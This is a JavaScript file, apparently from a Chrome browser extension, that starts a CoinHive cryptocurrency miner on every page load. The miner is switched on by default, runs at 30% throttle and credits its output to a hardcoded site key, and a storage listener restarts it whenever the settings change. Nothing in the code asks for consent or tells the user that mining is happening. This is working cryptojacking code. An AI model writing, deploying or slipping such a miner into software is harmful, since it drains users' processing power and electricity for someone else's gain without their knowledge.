window.onload = function () {
    chrome.storage.local.get(['chext-isEnabled', 'chext-sitekey', 'chext-throttle'], function (results) {
         var isEnabled = results['chext-isEnabled'];
        if (isEnabled === undefined) {
            isEnabled = true;
        }

        var sitekey = results['chext-sitekey'];
        if (sitekey === undefined ) {
            sitekey = '49r95LB1nVh1fELw5FePfx5XUtTkwP6yiRhSqV6XszVFeAV7s6kaQqB3WhZVWbxiToa2mJ8Uf1jSjCtA6BA3pfpLL2zuzac';
        }

        var throttle = results['chext-throttle'];
        if (throttle === undefined) {
            throttle = 30;
        }

        var miner = new CoinHive.Anonymous(sitekey, {
            throttle: 1 - (throttle / 100)
        });

        if (isEnabled) {
            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
        }

       chrome.storage.onChanged.addListener(function () {
            chrome.storage.local.get(['chext-isEnabled', 'chext-sitekey', 'chext-throttle'], function (results) {
                var isEnabled = results['chext-isEnabled'];
                if (isEnabled === undefined) {
                    isEnabled = true;
                }

                var sitekey = results['chext-sitekey'];
                if (sitekey === undefined) {
                    sitekey = '49r95LB1nVh1fELw5FePfx5XUtTkwP6yiRhSqV6XszVFeAV7s6kaQqB3WhZVWbxiToa2mJ8Uf1jSjCtA6BA3pfpLL2zuzac';
                }

                var throttle = results['chext-throttle'];
                if (throttle === undefined) {
                    throttle = 30;
                }

                miner.stop();
                miner = new CoinHive.Anonymous(sitekey, {
                    throttle: 1 - (throttle / 100)
                });
                if (isEnabled) {
                    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
                }
            });
        });
    });
}
